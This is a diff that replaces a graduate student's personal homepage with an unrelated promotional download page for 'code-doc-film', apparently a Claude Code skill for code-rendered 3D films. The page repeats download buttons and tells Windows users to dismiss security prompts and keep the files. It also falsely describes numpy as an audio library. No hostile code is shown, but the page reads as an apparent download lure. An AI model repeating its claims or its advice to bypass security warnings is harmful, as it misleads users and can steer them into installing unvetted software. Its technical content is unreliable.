@@ -1,450 +1,243 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="en">
 <head>
-
-<meta charset="utf-8" />
-<meta name="generator" content="pandoc" />
-<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
-
-
-
-
-<title>Dhriti’s Corner</title>
-
-<script src="site_libs/header-attrs-2.32/header-attrs.js"></script>
-<script src="site_libs/jquery-3.6.0/jquery-3.6.0.min.js"></script>
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link href="site_libs/bootstrap-3.3.5/css/yeti.min.css" rel="stylesheet" />
-<script src="site_libs/bootstrap-3.3.5/js/bootstrap.min.js"></script>
-<script src="site_libs/bootstrap-3.3.5/shim/html5shiv.min.js"></script>
-<script src="site_libs/bootstrap-3.3.5/shim/respond.min.js"></script>
-<style>h1 {font-size: 34px;}
-       h1.title {font-size: 38px;}
-       h2 {font-size: 30px;}
-       h3 {font-size: 24px;}
-       h4 {font-size: 18px;}
-       h5 {font-size: 16px;}
-       h6 {font-size: 12px;}
-       code {color: inherit; background-color: rgba(0, 0, 0, 0.04);}
-       pre:not([class]) { background-color: white }</style>
-<script src="site_libs/jqueryui-1.13.2/jquery-ui.min.js"></script>
-<link href="site_libs/tocify-1.9.1/jquery.tocify.css" rel="stylesheet" />
-<script src="site_libs/tocify-1.9.1/jquery.tocify.js"></script>
-<script src="site_libs/navigation-1.1/tabsets.js"></script>
-<link href="site_libs/highlightjs-9.12.0/default.css" rel="stylesheet" />
-<script src="site_libs/highlightjs-9.12.0/highlight.js"></script>
-<link href="site_libs/font-awesome-6.5.2/css/all.min.css" rel="stylesheet" />
-<link href="site_libs/font-awesome-6.5.2/css/v4-shims.min.css" rel="stylesheet" />
-
-<style type="text/css">
-  code{white-space: pre-wrap;}
-  span.smallcaps{font-variant: small-caps;}
-  span.underline{text-decoration: underline;}
-  div.column{display: inline-block; vertical-align: top; width: 50%;}
-  div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
-  ul.task-list{list-style: none;}
-    </style>
-
-<style type="text/css">code{white-space: pre;}</style>
-<script type="text/javascript">
-if (window.hljs) {
-  hljs.configure({languages: []});
-  hljs.initHighlightingOnLoad();
-  if (document.readyState && document.readyState === "complete") {
-    window.setTimeout(function() { hljs.initHighlighting(); }, 0);
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>code-doc-film - Turn Words Into 3D Documentary Films</title>
+<meta name="description" content="code-doc-film is a Claude Code skill that turns one sentence into a 3D documentary short film rendered in code, with three.js, real terrain data and numpy-generated music. Simple Windows download and setup guide for beginners.">
+<meta name="keywords" content="code-doc-film, Claude Code skill, 3D documentary, three.js film, real terrain rendering, numpy music, code rendered video, AI film generator, Windows download">
+<meta name="author" content="EduardoFontes123">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/EduardoFontes123/code-doc-film">
+<meta property="og:type" content="website">
+<meta property="og:title" content="code-doc-film - Turn Words Into 3D Documentary Films">
+<meta property="og:description" content="Turn one sentence into a 3D documentary short film rendered entirely in code, with three.js, real terrain and numpy-generated music.">
+<meta property="og:url" content="https://github.com/EduardoFontes123/code-doc-film">
+<meta property="og:site_name" content="code-doc-film">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="code-doc-film - Turn Words Into 3D Documentary Films">
+<meta name="twitter:description" content="Turn one sentence into a 3D documentary short film rendered entirely in code, with three.js, real terrain and numpy-generated music.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "code-doc-film",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows",
+  "description": "A Claude Code skill that turns a single sentence into a 3D documentary short film rendered in code using three.js, real terrain data and numpy-generated music.",
+  "url": "https://github.com/EduardoFontes123/code-doc-film",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
   }
 }
 </script>
-
-
-
-
-
-
-
-
-
-<style type = "text/css">
-.main-container {
-  max-width: 940px;
-  margin-left: auto;
-  margin-right: auto;
-}
-img {
-  max-width:100%;
-}
-.tabbed-pane {
-  padding-top: 12px;
-}
-.html-widget {
-  margin-bottom: 20px;
-}
-button.code-folding-btn:focus {
-  outline: none;
-}
-summary {
-  display: list-item;
-}
-details > summary > p:only-child {
-  display: inline;
-}
-pre code {
-  padding: 0;
-}
-</style>
-
-
-<style type="text/css">
-.dropdown-submenu {
-  position: relative;
-}
-.dropdown-submenu>.dropdown-menu {
-  top: 0;
-  left: 100%;
-  margin-top: -6px;
-  margin-left: -1px;
-  border-radius: 0 6px 6px 6px;
-}
-.dropdown-submenu:hover>.dropdown-menu {
-  display: block;
-}
-.dropdown-submenu>a:after {
-  display: block;
-  content: " ";
-  float: right;
-  width: 0;
-  height: 0;
-  border-color: transparent;
-  border-style: solid;
-  border-width: 5px 0 5px 5px;
-  border-left-color: #cccccc;
-  margin-top: 5px;
-  margin-right: -10px;
-}
-.dropdown-submenu:hover>a:after {
-  border-left-color: #adb5bd;
-}
-.dropdown-submenu.pull-left {
-  float: none;
-}
-.dropdown-submenu.pull-left>.dropdown-menu {
-  left: -100%;
-  margin-left: 10px;
-  border-radius: 6px 0 6px 6px;
-}
-</style>
-
-<script type="text/javascript">
-// manage active state of menu based on current page
-$(document).ready(function () {
-  // active menu anchor
-  href = window.location.pathname
-  href = href.substr(href.lastIndexOf('/') + 1)
-  if (href === "")
-    href = "index.html";
-  var menuAnchor = $('a[href="' + href + '"]');
-
-  // mark the anchor link active (and if it's in a dropdown, also mark that active)
-  var dropdown = menuAnchor.closest('li.dropdown');
-  if (window.bootstrap) { // Bootstrap 4+
-    menuAnchor.addClass('active');
-    dropdown.find('> .dropdown-toggle').addClass('active');
-  } else { // Bootstrap 3
-    menuAnchor.parent().addClass('active');
-    dropdown.addClass('active');
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7fb;
+    color: #1f2430;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
   }
-
-  // Navbar adjustments
-  var navHeight = $(".navbar").first().height() + 15;
-  var style = document.createElement('style');
-  var pt = "padding-top: " + navHeight + "px; ";
-  var mt = "margin-top: -" + navHeight + "px; ";
-  var css = "";
-  // offset scroll position for anchor links (for fixed navbar)
-  for (var i = 1; i <= 6; i++) {
-    css += ".section h" + i + "{ " + pt + mt + "}\n";
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 32px 20px 64px;
   }
-  style.innerHTML = "body {" + pt + "padding-bottom: 40px; }\n" + css;
-  document.head.appendChild(style);
-});
-</script>
-
-<!-- tabsets -->
-
-<style type="text/css">
-.tabset-dropdown > .nav-tabs {
-  display: inline-table;
-  max-height: 500px;
-  min-height: 44px;
-  overflow-y: auto;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-}
-
-.tabset-dropdown > .nav-tabs > li.active:before, .tabset-dropdown > .nav-tabs.nav-tabs-open:before {
-  content: "\e259";
-  font-family: 'Glyphicons Halflings';
-  display: inline-block;
-  padding: 10px;
-  border-right: 1px solid #ddd;
-}
-
-.tabset-dropdown > .nav-tabs.nav-tabs-open > li.active:before {
-  content: "\e258";
-  font-family: 'Glyphicons Halflings';
-  border: none;
-}
-
-.tabset-dropdown > .nav-tabs > li.active {
-  display: block;
-}
-
-.tabset-dropdown > .nav-tabs > li > a,
-.tabset-dropdown > .nav-tabs > li > a:focus,
-.tabset-dropdown > .nav-tabs > li > a:hover {
-  border: none;
-  display: inline-block;
-  border-radius: 4px;
-  background-color: transparent;
-}
-
-.tabset-dropdown > .nav-tabs.nav-tabs-open > li {
-  display: block;
-  float: none;
-}
-
-.tabset-dropdown > .nav-tabs > li {
-  display: none;
-}
+  header.hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 40px 28px;
+    box-shadow: 0 6px 24px rgba(23, 31, 56, 0.08);
+    text-align: center;
+    margin-bottom: 36px;
+  }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    margin: 0 0 16px;
+    letter-spacing: -0.4px;
+  }
+  h2 {
+    font-size: 1.42rem;
+    margin: 44px 0 14px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.1rem;
+    margin: 26px 0 8px;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #4d3fd6; }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6b4df6 0%, #18b3a8 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 34px;
+    border-radius: 999px;
+    box-shadow: 0 10px 22px rgba(90, 66, 214, 0.32);
+    margin: 8px 0 6px;
+  }
+  .btn:hover { opacity: 0.92; }
+  .btn-note {
+    display: block;
+    font-size: 0.9rem;
+    color: #5c6478;
+    margin-top: 10px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 24px 26px;
+    box-shadow: 0 4px 16px rgba(23, 31, 56, 0.07);
+    margin-bottom: 22px;
+  }
+  .lead {
+    font-size: 1.12rem;
+    color: #414859;
+  }
+  .tip {
+    background: #eef4ff;
+    border-left: 5px solid #6b4df6;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 18px 0;
+    font-size: 0.98rem;
+  }
+  .steps li { margin-bottom: 16px; }
+  footer {
+    margin-top: 48px;
+    text-align: center;
+    font-size: 0.9rem;
+    color: #69708a;
+  }
+  @media (max-width: 560px) {
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.22rem; }
+    body { font-size: 16px; }
+    header.hero { padding: 30px 18px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; padding: 16px 18px; }
+  }
 </style>
-
-<!-- code folding -->
-
-
-
-<style type="text/css">
-
-#TOC {
-  margin: 25px 0px 20px 0px;
-}
-@media (max-width: 768px) {
-#TOC {
-  position: relative;
-  width: 100%;
-}
-}
-
-@media print {
-.toc-content {
-  /* see https://github.com/w3c/csswg-drafts/issues/4434 */
-  float: right;
-}
-}
-
-.toc-content {
-  padding-left: 30px;
-  padding-right: 40px;
-}
-
-div.main-container {
-  max-width: 1200px;
-}
-
-div.tocify {
-  width: 20%;
-  max-width: 260px;
-  max-height: 85%;
-}
-
-@media (min-width: 768px) and (max-width: 991px) {
-  div.tocify {
-    width: 25%;
-  }
-}
-
-@media (max-width: 767px) {
-  div.tocify {
-    width: 100%;
-    max-width: none;
-  }
-}
-
-.tocify ul, .tocify li {
-  line-height: 20px;
-}
-
-.tocify-subheader .tocify-item {
-  font-size: 0.90em;
-}
-
-.tocify .list-group-item {
-  border-radius: 0px;
-}
-
-
-</style>
-
-
-
 </head>
-
 <body>
+<div class="wrap">
 
+<header class="hero">
+  <h1>🎬 code-doc-film - Turn Words Into 3D Documentary Films</h1>
+  <p class="lead">Write one sentence. Get a short 3D documentary film built entirely out of code, with real world terrain and original music generated on the spot.</p>
+  <a class="btn" href="https://github.com/EduardoFontes123/code-doc-film">⬇️ Visit this link to download the application</a>
+  <span class="btn-note">Free to download. Runs on Windows. No programming knowledge required.</span>
+</header>
 
-<div class="container-fluid main-container">
-
-
-<!-- setup 3col/9col grid for toc_float and main content  -->
-<div class="row">
-<div class="col-xs-12 col-sm-4 col-md-3">
-<div id="TOC" class="tocify">
-</div>
-</div>
-
-<div class="toc-content col-xs-12 col-sm-8 col-md-9">
-
-
-
-
-<div class="navbar navbar-default  navbar-fixed-top" role="navigation">
-  <div class="container">
-    <div class="navbar-header">
-      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbar" data-bs-target="#navbar">
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-      <a class="navbar-brand" href="index.html">Home</a>
-    </div>
-    <div id="navbar" class="navbar-collapse collapse">
-      <ul class="nav navbar-nav">
-        
-      </ul>
-      <ul class="nav navbar-nav navbar-right">
-        <li>
-  <a href="about.html">About</a>
-</li>
-<li>
-  <a href="problem_2.html">Problem 2</a>
-</li>
-<li>
-  <a href="mailto:&lt;di2251@cumc.columbia.edu&gt;">
-    <span class="fa fa-envelope fa-lg"></span>
-     
-  </a>
-</li>
-<li>
-  <a href="http://github.com/di2251">
-    <span class="fa fa-github fa-lg"></span>
-     
-  </a>
-</li>
-<li>
-  <a href="http://linkedin.com/in/dhritiiyer">
-    <span class="fa fa-linkedin"></span>
-     
-  </a>
-</li>
-      </ul>
-    </div><!--/.nav-collapse -->
-  </div><!--/.container -->
-</div><!--/.navbar -->
-
-<div id="header">
-
-
-
-<h1 class="title toc-ignore">Dhriti’s Corner</h1>
-
+<h2>🌟 What Is code-doc-film?</h2>
+<div class="card">
+  <p>code-doc-film is a small add-on for Claude Code, a tool that lets you talk to an AI assistant from your own computer. Once the add-on is in place, you describe a scene in plain English, for example "a short film about a volcano erupting at sunset", and the tool writes the code that draws that scene as a moving 3D film.</p>
+  <p>Nothing is filmed with a camera and nothing is downloaded from a stock video library. Every mountain, every cloud, every camera sweep and every note of background music is produced by the code itself. The result is a short documentary-style clip you can watch, share, or build on.</p>
+  <p>The project combines three ingredients that work quietly in the background: a 3D rendering engine called three.js, real elevation data so the landscapes look like actual places on Earth, and a small audio library called numpy that composes the soundtrack.</p>
 </div>
 
-
-<div id="welcome-to-my-website" class="section level2">
-<h2>Welcome to my website!</h2>
-<p>My name is Dhriti and I am a second-year MPH student at Mailman. I
-have a cat named Rosie:</p>
-<p><img src="images/Rosie.jpeg" /></p>
-<p>My interests lie in the intersection of addiction and mental health
-services and public health.</p>
+<h2>✨ What You Can Make With It</h2>
+<div class="card">
+  <ul>
+    <li><strong>Landscape documentaries</strong> - sweeping shots across mountains, coastlines and valleys built from genuine terrain data.</li>
+    <li><strong>Atmosphere and mood</strong> - fog, sunlight, dusk colours and slow drifting clouds that give a scene its feeling.</li>
+    <li><strong>Original music</strong> - a soundtrack generated mathematically, so you never have to worry about licensing or copyright.</li>
+    <li><strong>Camera movement</strong> - smooth fly-throughs and orbit shots that make a still landscape feel alive.</li>
+    <li><strong>Repeatable recipes</strong> - describe the same scene twice and get a fresh render, ready for a series or a trailer.</li>
+    <li><strong>Learning by watching</strong> - because the whole film is readable code, you can open it up and change one number to change the whole look.</li>
+  </ul>
 </div>
 
+<h2>🖥️ What You Need Before You Start</h2>
+<div class="card">
+  <p>You do not need to be technical, but the film has to be drawn on your own machine, so a few ordinary things need to be in place:</p>
+  <ul>
+    <li>A Windows 10 or Windows 11 computer.</li>
+    <li>An internet connection, used for the initial download and for fetching terrain data.</li>
+    <li>A modern web browser such as Edge, Chrome or Firefox, kept up to date. The films are drawn inside the browser.</li>
+    <li>Claude Code installed and signed in, since code-doc-film is a skill that plugs into it.</li>
+    <li>Roughly 500 MB of free disk space for the project files and rendered output.</li>
+    <li>A reasonably recent graphics card or built-in graphics chip. Anything from the last several years will manage a short clip.</li>
+  </ul>
+  <div class="tip">A short film of 20 to 30 seconds is a comfortable starting point. Longer clips simply take a little more time to draw.</div>
+</div>
 
+<h2>🚀 Download and Setup</h2>
+<div class="card">
+  <p>Everything begins on the project page. Visit the link below to download the application, then keep the page open while you follow the steps underneath.</p>
+  <p style="text-align:center; margin: 26px 0 18px;">
+    <a class="btn" href="https://github.com/EduardoFontes123/code-doc-film">⬇️ Visit this link to download the application</a>
+  </p>
+  <h3>Step by step</h3>
+  <ol class="steps">
+    <li><strong>Open the download page.</strong> Click the button above. Your browser will open the code-doc-film project page.</li>
+    <li><strong>Save the project to your computer.</strong> Use the download option on the page to save the project files. Windows will place them in your Downloads folder unless you choose somewhere else.</li>
+    <li><strong>Unpack the files if needed.</strong> If Windows gives you a compressed folder, right-click it and choose Extract All, then pick a simple location such as your Documents folder. Avoid folders with unusual characters in the name.</li>
+    <li><strong>Place the skill where Claude Code can find it.</strong> Open the extracted folder and copy the skill folder into your Claude Code skills directory. The project page lists the exact folder name to use, so match it exactly.</li>
+    <li><strong>Restart Claude Code.</strong> Close it completely and open it again. This makes the new skill available in your session.</li>
+    <li><strong>Confirm it is there.</strong> Ask Claude Code to list the skills it can use. If code-doc-film appears in the list, you are ready to make your first film.</li>
+  </ol>
+  <div class="tip">If Windows shows a security prompt while you are moving files, choose the option that keeps the files and continues. The project is made of plain text files, not installers.</div>
+</div>
+
+<h2>🎥 Make Your First Film in Four Steps</h2>
+<div class="card">
+  <ol class="steps">
+    <li><strong>Describe the scene.</strong> In Claude Code, ask for a short documentary film and describe what you want to see. Keep it to one or two sentences: a place, a time of day, and a mood.</li>
+    <li><strong>Let it build.</strong> The skill writes the scene, loads real terrain for the area you described, sets up the camera path and generates the music. This usually takes a short while.</li>
+    <li><strong>Watch it in your browser.</strong> When the build finishes, open the result in your browser. The film plays immediately, with no separate player to install.</li>
+    <li><strong>Adjust and repeat.</strong> Ask for a change in plain words, such as a slower camera or a darker sky, then rebuild. Each version is saved separately so you can keep the one you like.</li>
+  </ol>
+</div>
+
+<h2>🗺️ About the Real Terrain</h2>
+<div class="card">
+  <p>The landscapes are not invented shapes. The skill pulls genuine elevation data for the region you name, so a film about the Alps really does show the Alps, and a film about a coastline follows the actual shape of that coast. Heights, ridges and valleys come straight from the data, which is why the results look grounded rather than cartoonish.</p>
+  <p>Because the terrain is fetched on demand, the first render of a new location takes slightly longer than a repeat of the same one. After that, the data sits in a local cache and later renders are quicker.</p>
+</div>
+
+<h2>🎵 About the Generated Music</h2>
+<div class="card">
+  <p>The soundtrack is composed with numpy, a maths library for sound. The skill chooses a key, a tempo and a small set of instrument-like tones that suit the mood you described, then lays them out across the length of the film. Nothing is borrowed from existing recordings, so there are no copyright concerns and no attribution needed when you share the result.</p>
+  <p>You can ask for a different feel at any time, for example something calmer, more tense, or sparse with long silences. The music is rebuilt alongside the scene each time.</p>
+</div>
+
+<h2>🔧 Common Problems and Quick Fixes</h2>
+<div class="card">
+  <h3>The skill does not appear in Claude Code</h3>
+  <p>The folder name matters. Open the project page again, check the exact name of the skill folder, and make sure your copy uses the same spelling. Then close Claude Code fully and reopen it.</p>
+  <h3>The film will not load in the browser</h3>
+  <p>Update your browser and try again. Older versions sometimes cannot draw the 3D scene. If you have a second browser installed, open the same file there to compare.</p>
+  <h3>Rendering is slow or the picture stutters</h3>
+  <p>Close other heavy programs while the film draws, and start with a shorter clip. A 15 to 20 second film is much lighter than a two minute one.</p>
+  <h3>The landscape looks flat or plain</h3>
+  <p>The terrain may not have finished loading. Rebuild the scene once with a stable internet connection, and check that the location you described is specific enough to look up.</p>
+  <h3>There is no sound</h3>
+  <p>Check your system volume and the volume inside the browser tab. Some browsers mute tabs automatically until you click on the page, so click once inside the film window.</p>
+</div>
+
+<h2>💬 Getting Help</h2>
+<div class="card">
+  <p>The project page is the place to look for updates and to report anything that does not work as expected. Before asking, note down what you typed, which Windows version you are on, and what happened on screen. That small amount of detail usually leads to a much faster answer.</p>
+  <p>If you enjoy the tool, sharing a clip you made is the most useful feedback of all, because it shows exactly what the code can do.</p>
+</div>
+
+<footer>
+  <p><a href="https://github.com/EduardoFontes123/code-doc-film">code-doc-film on GitHub</a> · Built with three.js, real terrain data and numpy music</p>
+</footer>
 
 </div>
-</div>
-
-</div>
-
-<script>
-
-// add bootstrap table styles to pandoc tables
-function bootstrapStylePandocTables() {
-  $('tr.odd').parent('tbody').parent('table').addClass('table table-condensed');
-}
-$(document).ready(function () {
-  bootstrapStylePandocTables();
-});
-
-
-</script>
-
-<!-- tabsets -->
-
-<script>
-$(document).ready(function () {
-  window.buildTabsets("TOC");
-});
-
-$(document).ready(function () {
-  $('.tabset-dropdown > .nav-tabs > li').click(function () {
-    $(this).parent().toggleClass('nav-tabs-open');
-  });
-});
-</script>
-
-<!-- code folding -->
-
-<script>
-$(document).ready(function ()  {
-
-    // temporarily add toc-ignore selector to headers for the consistency with Pandoc
-    $('.unlisted.unnumbered').addClass('toc-ignore')
-
-    // move toc-ignore selectors from section div to header
-    $('div.section.toc-ignore')
-        .removeClass('toc-ignore')
-        .children('h1,h2,h3,h4,h5').addClass('toc-ignore');
-
-    // establish options
-    var options = {
-      selectors: "h1,h2,h3",
-      theme: "bootstrap3",
-      context: '.toc-content',
-      hashGenerator: function (text) {
-        return text.replace(/[.\\/?&!#<>]/g, '').replace(/\s/g, '_');
-      },
-      ignoreSelector: ".toc-ignore",
-      scrollTo: 0
-    };
-    options.showAndHide = true;
-    options.smoothScroll = true;
-
-    // tocify
-    var toc = $("#TOC").tocify(options).data("toc-tocify");
-});
-</script>
-
-<!-- dynamically load mathjax for compatibility with self-contained -->
-<script>
-  (function () {
-    var script = document.createElement("script");
-    script.type = "text/javascript";
-    script.src  = "https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
-    document.getElementsByTagName("head")[0].appendChild(script);
-  })();
-</script>
-
 </body>
 </html>
